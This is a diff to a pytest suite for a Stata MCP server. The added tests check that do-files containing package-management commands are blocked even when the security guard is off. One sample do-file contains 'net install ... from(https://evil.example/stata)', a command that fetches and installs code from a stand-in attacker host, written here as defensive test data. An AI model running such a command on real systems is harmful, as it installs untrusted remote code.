@@ -6,6 +6,7 @@ import importlib
 import sys
 from pathlib import Path
 from types import ModuleType, SimpleNamespace
+from unittest.mock import Mock
 
 import pytest
 
@@ -41,8 +42,12 @@ def loaded_mcp_servers(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
         def __init__(self, *args, **kwargs) -> None:
             pass
 
+    class _Context:
+        pass
+
     fastmcp_module.FastMCP = _FastMCP
     fastmcp_module.Icon = _Icon
+    fastmcp_module.Context = _Context
 
     mcp_module = ModuleType("mcp")
     mcp_server_module = ModuleType("mcp.server")
@@ -253,6 +258,63 @@ def test_stata_do_logs_warning_when_guard_is_disabled(
         loaded_mcp_servers.stata_do(dofile.as_posix())
 
     assert any("[SECURITY] Guard is disabled" in message for message in caplog.messages)
+
+
+def test_mcp_stata_do_rejects_package_management_when_guard_is_disabled(
+    monkeypatch: pytest.MonkeyPatch,
+    loaded_mcp_servers,
+    tmp_path: Path,
+):
+    do_dir = tmp_path / "do"
+    do_dir.mkdir()
+    work_dir = tmp_path / "work"
+    work_dir.mkdir()
+    dofile = work_dir / "install.do"
+    dofile.write_text("ssc install reghdfe", encoding="utf-8")
+
+    _configure_base(monkeypatch, loaded_mcp_servers, do_dir, work_dir, tmp_path)
+
+    result = loaded_mcp_servers.stata_do(dofile.as_posix())
+
+    assert result["action"] == "Security check, dofile not executed"
+    assert "Package-management commands detected" in result["warning"]
+
+
+def test_api_stata_do_rejects_package_management_when_guard_is_disabled(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+):
+    stata_do_api = importlib.import_module("stata_mcp.api.stata_do")
+    do_dir = tmp_path / "do"
+    do_dir.mkdir()
+    work_dir = tmp_path / "work"
+    work_dir.mkdir()
+    dofile = work_dir / "install.do"
+    dofile.write_text("net install custompkg, from(https://evil.example/stata)")
+    runtime = SimpleNamespace(
+        config=SimpleNamespace(
+            STATA_MCP_FOLDER=SimpleNamespace(DO=do_dir),
+            WORKING_DIR=work_dir,
+            IS_GUARD=False,
+            IS_MONITOR=False,
+        ),
+        stata_cli="stata",
+        log_base_path=tmp_path,
+        is_unix=True,
+        cwd=work_dir,
+    )
+    stata_executor = Mock()
+    monkeypatch.setattr(
+        stata_do_api,
+        "create_runtime_context",
+        lambda **kwargs: runtime,
+    )
+    monkeypatch.setattr(stata_do_api, "StataDo", stata_executor)
+
+    result = stata_do_api.stata_do(dofile.as_posix())
+
+    assert result["action"] == "Security check, dofile not executed"
+    stata_executor.assert_not_called()
 
 
 class TestValidateLogName:
